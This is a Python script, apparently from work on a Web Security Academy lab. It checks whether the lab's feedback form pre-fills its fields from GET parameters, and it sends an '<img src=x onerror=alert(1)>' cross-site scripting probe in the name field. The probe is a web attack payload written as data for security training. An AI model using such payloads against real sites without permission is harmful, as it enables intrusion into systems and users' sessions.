#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

BASE_URL = "https://0a3900c304b67111838b512800a90077.web-security-academy.net"

# Test if GET parameters prefill the form
params = {
    'name': '<img src=x onerror=alert(1)>',
    'email': 'test@test.com',
    'subject': 'Test Subject',
    'message': 'Test Message'
}

response = requests.get(f"{BASE_URL}/feedback", params=params)
soup = BeautifulSoup(response.text, 'html.parser')

print("[*] Checking if form fields are pre-filled...")

# Check name field
name_input = soup.find('input', {'name': 'name'})
if name_input:
    value = name_input.get('value', '')
    print(f"Name field value: '{value}'")
    if value:
        print("[✓] Name field is pre-filled!")
    else:
        print("[✗] Name field is NOT pre-filled")

# Check email field  
email_input = soup.find('input', {'name': 'email'})
if email_input:
    value = email_input.get('value', '')
    print(f"Email field value: '{value}'")

# Check subject field
subject_input = soup.find('input', {'name': 'subject'})
if subject_input:
    value = subject_input.get('value', '')
    print(f"Subject field value: '{value}'")

# Check message field
message_textarea = soup.find('textarea', {'name': 'message'})
if message_textarea:
    content = message_textarea.string or ''
    print(f"Message field content: '{content}'")

# Save the HTML to inspect
with open('prefill_test.html', 'w') as f:
    f.write(response.text)
print("\n[*] Full response saved to prefill_test.html")

# Also test the direct URL
print("\n[*] Testing direct URL with parameters:")
test_url = f"{BASE_URL}/feedback?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E&email=test@test.com&subject=test&message=test"
print(f"URL: {test_url}")

response2 = requests.get(test_url)
soup2 = BeautifulSoup(response2.text, 'html.parser')

name_input2 = soup2.find('input', {'name': 'name'})
if name_input2:
    value2 = name_input2.get('value', '')
    print(f"Name field value with encoded URL: '{value2}'")